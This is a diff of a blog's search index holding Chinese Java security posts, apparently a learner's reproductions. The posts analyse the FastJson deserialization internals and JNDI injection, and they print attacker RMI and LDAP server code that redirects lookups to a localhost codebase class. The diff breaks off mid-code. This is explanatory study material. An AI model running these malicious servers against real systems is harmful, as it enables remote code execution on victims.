+<p>在这个中，它会循环处理字符串，摘取类似”name”:”123”这样的key-value对。拖在这个过程中存在symbolTable中的字段，就会进TypeUtils.loadClass()函数。在这个里面若经过了checkAutoType的检查之后。紧接着就会获取对应的deserializer。</p>
+<p><img src="4.png" alt=""></p>
+<p>简单来说就是根据获取的clazz获取对应的deserilizer。若在预定数组中的类，则可以调用相关类的<code>deserialze</code>方法完成反序列化操作。若没有，则进入asm创建处理类的流程。在获取deserializer之后，会调用其deserilze函数进行反序列化。</p>
+<h4 id="JSON字符串的解析"><a href="#JSON字符串的解析" class="headerlink" title="JSON字符串的解析"></a>JSON字符串的解析</h4><p>Json字符串的核心处理流程是在DefaultJSONParser#parse中根据json字符串的标志位来进行分发的。</p>
+<p>最开始的标志位为<code>{</code>。</p>
+<pre><code>1. 判断下一个标志位是否为`&quot;`，若是则提取key值，这时的标志位为第二个`&quot;`。
+2. 判断下一个标志位是否为`:`
+    + 如果为`:`，则判断下一个标志位是否为`&quot;`，如果是，则获取value值，此时的标志位为`&quot;`
+    + 如果为`{`，则重复1～2过程
+3. 判断下一个标志位是否为`}`
+    + 若为`}`则表示这一单元的解析结束
+    + 若为`,`则表示要解析下一个嵌套数据，重复1～3</code></pre><p>根据不同的标志位进行不同的解析，当解析过程中遇到了<code>@type</code>或<code>$ref</code>时，将当作特殊的标志做相应的处理。</p>
+<h4 id="JavaBeanDeserializer"><a href="#JavaBeanDeserializer" class="headerlink" title="JavaBeanDeserializer"></a>JavaBeanDeserializer</h4><p>这里进入了JavaBeanDeserializer类进行处理。在该类的构造函数中，将JavaBeanInfo中的信息，包括fieldList等放入了sortedFieldDeserializers中。</p>
+<p>其deserialze这部分会遍历整个sortedFieldDeserializers中所有的key，并尝试根据类型来提取json字符串中相应的信息。若成功则转交给asm生成的处理类的createInstance实例化对象，若不成功则扫描json字符串中是否具有特殊指令集。</p>
+<h4 id="获取Deserilizer"><a href="#获取Deserilizer" class="headerlink" title="获取Deserilizer"></a>获取Deserilizer</h4><p>跟进一下getDeserializer()函数。</p>
+<p><img src="5.png" alt=""></p>
+<p>首先会尝试在deserializers中匹配type，若有则直接返回。没有则调用getDeserializer继续处理。跟进getDeserializer()。这部分代码很长，当不匹配上面的各种情况时，会调用到createJavaBeanDeserializer来创建一个新的deserializer。跟进createJavaBeanDeserializer()。</p>
+<p><img src="6.png" alt=""></p>
+<p>然后将生成的deserializer将其加入deserializers这个map。</p>
+<h4 id="JavaBeanInfo"><a href="#JavaBeanInfo" class="headerlink" title="JavaBeanInfo"></a>JavaBeanInfo</h4><p>在进入build函数后，会遍历一遍传入所有方法，寻找满足set开头的特定类型方法。setter方法的要求:</p>
+<ul>
+<li>方法名长度大于4且以set开头，且第四个字母需要大写</li>
+<li>非静态方法</li>
+<li>返回类型为void或者当前类</li>
+<li>参数个数为1</li>
+</ul>
+<p>获取符合条件的setter方法后，再获取propertyName。</p>
+<ul>
+<li>若第四个字符是大写的，则将其变为小写，然后获取propertyName值</li>
+<li>若第四个字符为<code>_</code>，直接获取<code>_</code>之后的值，然后同第一个一样处理</li>
+<li>若第四个字符为<code>f</code>，则直接去掉set即可</li>
+</ul>
+<p>然后判断获取到的propertyName是否在类成员变量中。如果不在并且其返回值为Boolean类型，就将其propertyName第一个字母大写，且加上<code>is</code>作为新的propertyName，去查找是否存在此成员变量。</p>
+<p><img src="7.png" alt=""></p>
+<p>当找到成员变量后，就将其放入fieldList中，放入的是一个FieldInfo对象，包括了(propertyName,method,field,clazz,type)等的信息。</p>
+<p>然后再次遍历所有方法，寻找到满足get开头方法。然后getter方法要求如下:</p>
+<ul>
+<li>函方法名长度大于4且以get开头，且第四个字母需要大写</li>
+<li>非静态方法</li>
+<li>函数没有入口参数</li>
+<li>继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong</li>
+</ul>
+<p>将第四个字母转为小写，然后将去掉get的值作为propertyName，然后从fieldList中查找是否存在该propertyName对应的fieldInfo。如果没有，则将该propertyName与此get方法的信息加入fieldList，其中field为null。<br><img src="8.png" alt=""></p>
+<p>遍历完所有的setter和getter方法后，就获取到了一个JavaBeanInfo对象，里面包括了该过程中生成的fieldList。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://xz.aliyun.com/t/7027#toc-23" target="_blank" rel="noopener">JAVA反序列化—FastJson组件</a></li>
+<li><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">Fastjson 流程分析及 RCE 分析</a></li>
 </ul>
 ]]></content>
       <categories>
@@ -1007,139 +1110,6 @@
       </categories>
   </entry>
   <entry>
-    <title>FastJson反序列化介绍</title>
-    <url>/2020/05/20/fastjson-introduction/</url>
-    <content><![CDATA[<p>之前虽然看了FastJson相关的内容，在复现的时候还是遇到了不少问题。因为比较详细地分析了下FastJson反序列化的过程，因此，记录了下来。</p>
-<a id="more"></a>
-
-<h2 id="FastJson简介"><a href="#FastJson简介" class="headerlink" title="FastJson简介"></a>FastJson简介</h2><p>FastJson自己实现了一套反序列化的机制，并没有使用默认的readObject()，在序列化反序列化的时候会进行一些操作，调用到一些setter和getter函数，从而造成命令执行。</p>
-<h3 id="API介绍"><a href="#API介绍" class="headerlink" title="API介绍"></a>API介绍</h3><ul>
-<li>序列化<ul>
-<li>JSON.toJSONString()</li>
-</ul>
-</li>
-<li>反序列化<ul>
-<li>JSON.parse()   返回实际类型对象</li>
-<li>JSON.parseObject()   返回JSONObject类型对象</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<p>FastJson中提供特殊字段符<code>@type</code>。该字段可以指定反序列化任意类，并在反序列化过程中自动调用类中属性的公有的set、get、is方法。(这个is方法有待验证)</p>
-</blockquote>
-<p>根据很多的实验可知，反序列化的规律:</p>
-<ul>
-<li>该类的无参构造函数被调用</li>
-<li>public修饰的属性直接反序列化成功</li>
-<li>private修饰的属性调用setter方法进行赋值</li>
-<li>getter函数会根据函数返回值不同，选择被调用或不被调用</li>
-</ul>
-<blockquote>
-<p>若一定要反序列化私有属性，可以给parseObject方法加入<code>Feature.SupportNonPublicField</code>。加入之后，它的调用方式与parse()一样，而与parseObject()无关了。后面会分析到这一点。</p>
-</blockquote>
-<h3 id="反序列化的对比"><a href="#反序列化的对比" class="headerlink" title="反序列化的对比"></a>反序列化的对比</h3><p>在FastJson的反序列化过程中，最明显的是parse()和parseObject()进行反序列化时，有着很大的不同。<br>从下图可以看到，JSONObject()调用了parse()方法，只是在最后多了一个toJSON()方法，它在toJSON()方法里面对所有的getter方法进行调用。<br><img src="1.png" alt=""></p>
-<p>除此之外，还有2个属性的影响:</p>
-<ul>
-<li>有无class类型</li>
-<li>有无Feature.SupportNonPublicField属性</li>
-</ul>
-<h4 id="1-有无class类型"><a href="#1-有无class类型" class="headerlink" title="1.有无class类型"></a>1.有无class类型</h4><p><strong>无class类型</strong>: parseObject(str)  </p>
-<ul>
-<li>调用类的构造方法</li>
-<li>所有属性的getter方法</li>
-<li>所有属性的setter方法</li>
-</ul>
-<p><strong>有class类型</strong>: parseObject(str,*.class)  </p>
-<ul>
-<li>调用类的构造方法</li>
-<li>非私有属性的setter方法</li>
-<li>特定类型的getter方法。</li>
-</ul>
-<h4 id="2-有Feature-SupportNonPublicField属性"><a href="#2-有Feature-SupportNonPublicField属性" class="headerlink" title="2.有Feature.SupportNonPublicField属性"></a>2.有Feature.SupportNonPublicField属性</h4><p>添加了Feature的parseObject()实际上等同于添加了Feature的parse()方法<br><img src="2.png" alt=""></p>
-<ul>
-<li>调用类的构造方法</li>
-<li>所有属性的setter方法</li>
-<li>特定类型的getter方法</li>
-</ul>
-<h3 id="FastJson反序列化流程"><a href="#FastJson反序列化流程" class="headerlink" title="FastJson反序列化流程"></a>FastJson反序列化流程</h3><p>由于parseObject()只是比parse()多了个toJSON()的过程。整个反序列化分析流程就以parseObject()为例。</p>
-<p>其中最主要的是DefaultJSONParser类，在该类中会调用很多其他的类来一起完成整个过程。来看看这个类。</p>
-<h4 id="DefaultJSONParser"><a href="#DefaultJSONParser" class="headerlink" title="DefaultJSONParser"></a>DefaultJSONParser</h4><p>在这个里面有几个比较关键的类:</p>
-<pre><code>+ JSONLexer
-+ ParserConfig
-+ JavaBeanDeserializer
-+ JSONScanner
-+ ObjectDeserializer</code></pre><p>首先进入parse()函数，在该函数中调用DefaultJSONParser的parse()函数。<br><img src="3.png" alt=""></p>
-<p>进入DefaultJSONParser.parse()函数，会根据lexer.token的值来选择处理方式。这个lexter是继承自JSONLexerBase的JSONScanner。它对很多特殊符号如<code>{</code>、<code>[</code>等都赋了值。显然由于字符串的第一个字符为<code>{</code>,其token值为12。则进入DefaultJSONParser.parseObject()函数。</p>
-<p>在这个中，它会循环处理字符串，摘取类似”name”:”123”这样的key-value对。拖在这个过程中存在symbolTable中的字段，就会进TypeUtils.loadClass()函数。在这个里面若经过了checkAutoType的检查之后。紧接着就会获取对应的deserializer。</p>
-<p><img src="4.png" alt=""></p>
-<p>简单来说就是根据获取的clazz获取对应的deserilizer。若在预定数组中的类，则可以调用相关类的<code>deserialze</code>方法完成反序列化操作。若没有，则进入asm创建处理类的流程。在获取deserializer之后，会调用其deserilze函数进行反序列化。</p>
-<h4 id="JSON字符串的解析"><a href="#JSON字符串的解析" class="headerlink" title="JSON字符串的解析"></a>JSON字符串的解析</h4><p>Json字符串的核心处理流程是在DefaultJSONParser#parse中根据json字符串的标志位来进行分发的。</p>
-<p>最开始的标志位为<code>{</code>。</p>
-<pre><code>1. 判断下一个标志位是否为`&quot;`，若是则提取key值，这时的标志位为第二个`&quot;`。
-2. 判断下一个标志位是否为`:`
-    + 如果为`:`，则判断下一个标志位是否为`&quot;`，如果是，则获取value值，此时的标志位为`&quot;`
-    + 如果为`{`，则重复1～2过程
-3. 判断下一个标志位是否为`}`
-    + 若为`}`则表示这一单元的解析结束
-    + 若为`,`则表示要解析下一个嵌套数据，重复1～3</code></pre><p>根据不同的标志位进行不同的解析，当解析过程中遇到了<code>@type</code>或<code>$ref</code>时，将当作特殊的标志做相应的处理。</p>
-<h4 id="JavaBeanDeserializer"><a href="#JavaBeanDeserializer" class="headerlink" title="JavaBeanDeserializer"></a>JavaBeanDeserializer</h4><p>这里进入了JavaBeanDeserializer类进行处理。在该类的构造函数中，将JavaBeanInfo中的信息，包括fieldList等放入了sortedFieldDeserializers中。</p>
-<p>其deserialze这部分会遍历整个sortedFieldDeserializers中所有的key，并尝试根据类型来提取json字符串中相应的信息。若成功则转交给asm生成的处理类的createInstance实例化对象，若不成功则扫描json字符串中是否具有特殊指令集。</p>
-<h4 id="获取Deserilizer"><a href="#获取Deserilizer" class="headerlink" title="获取Deserilizer"></a>获取Deserilizer</h4><p>跟进一下getDeserializer()函数。</p>
-<p><img src="5.png" alt=""></p>
-<p>首先会尝试在deserializers中匹配type，若有则直接返回。没有则调用getDeserializer继续处理。跟进getDeserializer()。这部分代码很长，当不匹配上面的各种情况时，会调用到createJavaBeanDeserializer来创建一个新的deserializer。跟进createJavaBeanDeserializer()。</p>
-<p><img src="6.png" alt=""></p>
-<p>然后将生成的deserializer将其加入deserializers这个map。</p>
-<h4 id="JavaBeanInfo"><a href="#JavaBeanInfo" class="headerlink" title="JavaBeanInfo"></a>JavaBeanInfo</h4><p>在进入build函数后，会遍历一遍传入所有方法，寻找满足set开头的特定类型方法。setter方法的要求:</p>
-<ul>
-<li>方法名长度大于4且以set开头，且第四个字母需要大写</li>
-<li>非静态方法</li>
-<li>返回类型为void或者当前类</li>
-<li>参数个数为1</li>
-</ul>
-<p>获取符合条件的setter方法后，再获取propertyName。</p>
-<ul>
-<li>若第四个字符是大写的，则将其变为小写，然后获取propertyName值</li>
-<li>若第四个字符为<code>_</code>，直接获取<code>_</code>之后的值，然后同第一个一样处理</li>
-<li>若第四个字符为<code>f</code>，则直接去掉set即可</li>
-</ul>
-<p>然后判断获取到的propertyName是否在类成员变量中。如果不在并且其返回值为Boolean类型，就将其propertyName第一个字母大写，且加上<code>is</code>作为新的propertyName，去查找是否存在此成员变量。</p>
-<p><img src="7.png" alt=""></p>
-<p>当找到成员变量后，就将其放入fieldList中，放入的是一个FieldInfo对象，包括了(propertyName,method,field,clazz,type)等的信息。</p>
-<p>然后再次遍历所有方法，寻找到满足get开头方法。然后getter方法要求如下:</p>
-<ul>
-<li>函方法名长度大于4且以get开头，且第四个字母需要大写</li>
-<li>非静态方法</li>
-<li>函数没有入口参数</li>
-<li>继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong</li>
-</ul>
-<p>将第四个字母转为小写，然后将去掉get的值作为propertyName，然后从fieldList中查找是否存在该propertyName对应的fieldInfo。如果没有，则将该propertyName与此get方法的信息加入fieldList，其中field为null。<br><img src="8.png" alt=""></p>
-<p>遍历完所有的setter和getter方法后，就获取到了一个JavaBeanInfo对象，里面包括了该过程中生成的fieldList。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://xz.aliyun.com/t/7027#toc-23" target="_blank" rel="noopener">JAVA反序列化—FastJson组件</a></li>
-<li><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">Fastjson 流程分析及 RCE 分析</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>JAVA安全</category>
-      </categories>
-      <tags>
-        <tag>FastJson</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ripstech Java Security 2019 Calendar复现系列</title>
-    <url>/2020/04/30/java-calendar-2019/</url>
-    <content><![CDATA[<p>为了了解java安全，也算是入门一下java安全，把Ripstech上的2019 Java Calendar复现了一遍。</p>
-<a id="more"></a>
-<p>具体分析发表在了先知社区。</p>
-<p><a href="https://xz.aliyun.com/t/7098" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(一)</a><br><a href="https://xz.aliyun.com/t/7162" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(二)</a><br><a href="https://xz.aliyun.com/t/7206" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(三)</a><br><a href="https://xz.aliyun.com/t/7247" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(四)</a>  </p>
-<p>环境放在了<a href="https://github.com/ananaskr/Java_Calendar_2019" target="_blank" rel="noopener">github</a>上。</p>
-]]></content>
-      <categories>
-        <category>JAVA安全</category>
-      </categories>
-  </entry>
-  <entry>
     <title>JAVA反序列化有关基础知识</title>
     <url>/2020/04/29/java-basic/</url>
     <content><![CDATA[<p>这篇文章主要是记录在学习Java安全过程中需要用到的重要的知识点。</p>
@@ -1226,173 +1196,17 @@
       </categories>
   </entry>
   <entry>
-    <title>JNDI注入分析复现总结</title>
-    <url>/2020/06/06/jndi-injection/</url>
-    <content><![CDATA[<p>前面的文章总结了RMI的安全性问题，而JNDI注入这类问题比RMI安全问题更常见。这篇文章分析了JNDI注入的整个流程，以及如何绕过高版本的2种方式。所有的代码放在了<a href="https://github.com/ananaskr/rmi/tree/master/src/main/java/jndi" target="_blank" rel="noopener">github</a>上。</p>
+    <title>Ripstech Java Security 2019 Calendar复现系列</title>
+    <url>/2020/04/30/java-calendar-2019/</url>
+    <content><![CDATA[<p>为了了解java安全，也算是入门一下java安全，把Ripstech上的2019 Java Calendar复现了一遍。</p>
 <a id="more"></a>
-
-<h1 id="JNDI注入介绍"><a href="#JNDI注入介绍" class="headerlink" title="JNDI注入介绍"></a>JNDI注入介绍</h1><p>JNDI注入是BlackHat 2016的一个议题<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">“A Journey From JNDI LDAP Manipulation To RCE”</a>。</p>
-<p>JNDI注入包括以下几种方法:</p>
-<ul>
-<li>JNDI配合RMI远程对象(codebase)</li>
-<li>JNDI Reference配合RMI</li>
-<li>JNDI Reference配合LDAP</li>
-</ul>
-<p>此攻击的整个步骤包括以下几步:</p>
-<ol>
-<li>服务端实例化JNDI initialContext</li>
-<li>initialContext初始化期间调用lookup(rmi://attacker/Obj)请求攻击者的恶意RMIServer/LDAPServer</li>
-<li>恶意RMIServer/LDAPServer返回JNDI Reference</li>
-<li>服务端接收到JNDI Reference后从恶意RMIServer/LDAPServer获取工厂类</li>
-<li>恶意RMIServer返回的工厂类中带有static块的Java代码，造成RCE</li>
-</ol>
-<h1 id="JNDI配合RMI远程对象"><a href="#JNDI配合RMI远程对象" class="headerlink" title="JNDI配合RMI远程对象"></a>JNDI配合RMI远程对象</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>攻击者将一个恶意的RMI远程对象绑定在RMI Registry上，然后将编译后远程对象类放在WEB服务器上，这个codebase地址由远程服务器的<code>java.rmi.server.codebase</code>属性设置，供受害者RMI客户端远程加载，RMI在lookup时，会先尝试在本地CLASSPATH中获取对应的Stub类定义，并从本地加载，若本地没有，则会向远程codebase指定地址去获取恶意对象。</p>
-<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>此方式需要满足两个条件:</p>
-<ol>
-<li>安装并配置了SecurityManager</li>
-<li>Java版本低于7u21、6u45，或者设置了<code>java.rmi.server.useCodebaseOnly=false</code>。  </li>
-</ol>
-<p>官方将<code>java.rmi.server.useCodebaseOnly</code>的默认值由flase改成了true，在这样的情况下，Java虚拟机将只信任预先配置好的codebase，不再支持从RMI请求中获取。</p>
-<blockquote>
-<p>JNDI Naming Reference。JDK 7u21开始，java.rmi.server.useCodebaseOnly 默认值就为true，防止RMI客户端VM从其他Codebase地址上动态加载类。然而JNDI注入中的Reference Payload并不受useCodebaseOnly影响，因为它没有用到 RMI Class loading，它最终是通过URLClassLoader加载的远程类。</p>
-</blockquote>
-<h1 id="JNDI-Reference配合RMI"><a href="#JNDI-Reference配合RMI" class="headerlink" title="JNDI Reference配合RMI"></a>JNDI Reference配合RMI</h1><p>代码:</p>
-<ul>
-<li><p>Client.java</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String uri = <span class="string">""</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Server.java</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SERVER</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference aa = <span class="keyword">new</span> Reference(<span class="string">"ExecTest"</span>, <span class="string">"ExecTest"</span>, <span class="string">"http://127.0.0.1:8081/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(aa);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"aa"</span>, refObjWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>ExecTest.java</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure>
-<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>攻击者在RMI服务绑定一个JNDI Naming Reference，受害者接收到此Reference类后在解析时，会根据指定的codebase远程地址加载Factory类，原理上并非使用RMI Class Loading机制，不受第一种方式的限制。</p>
-<h2 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h2><p>从客户端lookup开始进行分析。进入客户端的lookup函数。</p>
-</li>
-</ul>
-<p><img src="1.png" alt=""></p>
-<p>先跟进getURLOrDefaultInitCtx(name)，然后再跟进lookup(name)。</p>
-<p><img src="2.png" alt=""></p>
-<p>通过url获取到scheme，即rmi，在该函数里初始化了rmiURLContext。然后跟进lookup(name)。</p>
-<p><img src="3.png" alt=""></p>
-<p>在这里进入到了GenericURLContext#lookup。然后继续跟进lookup。</p>
-<p><img src="4.png" alt=""></p>
-<p>这里调用了RegistryImpl_Stub#lookup函数。此lookup函数的作用在前面介绍RMI安全的已经介绍过了。即发送字符串到注册中心(即服务端)。服务端会根据字符串查找对应的ReferenceWrapper对象，然后返回给客户端。继续跟进decodeObject()函数。</p>
-<p><img src="5.png" alt=""></p>
-<p>如果是Reference对象，就会进入getReference()，获得绑定的Reference类。然后进入NamingManager.getObjectInstance()函数。</p>
-<p><img src="6.png" alt=""></p>
-<p>然后跟进getObjectFactoryFromReference()函数。</p>
-<p><img src="7.png" alt=""></p>
-<p>在该函数中，通过factoryName:ExecTest和codebase:<a href="http://127.0.0.1:8081/加载了class，然后在末尾执行newInstance进行实例化，从而RCE。" target="_blank" rel="noopener">http://127.0.0.1:8081/加载了class，然后在末尾执行newInstance进行实例化，从而RCE。</a></p>
-<h2 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h2><p>在JDK6u132、JDK7u122以及JDK8u113版本后，系统属性com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase默认值变为false，即不允许从远程的Codebase加载Reference工厂类。</p>
-<p><img src="8.png" alt=""></p>
-<p>并且在decodeObject()函数中增加了对trustURLCodebase的判断。</p>
-<blockquote>
-<p>在JDK8u111中，即使将trustURLCodebase默认值变为false，由于在decodeObject中并没有对于trustURLCodebase的判断，依然能够成功。</p>
-</blockquote>
-<h1 id="JNDI-Reference配合LDAP"><a href="#JNDI-Reference配合LDAP" class="headerlink" title="JNDI Reference配合LDAP"></a>JNDI Reference配合LDAP</h1><ul>
-<li><p>Client.java</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String uri = <span class="string">""</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>ldap_server.java</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8081/#ExecTest"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span 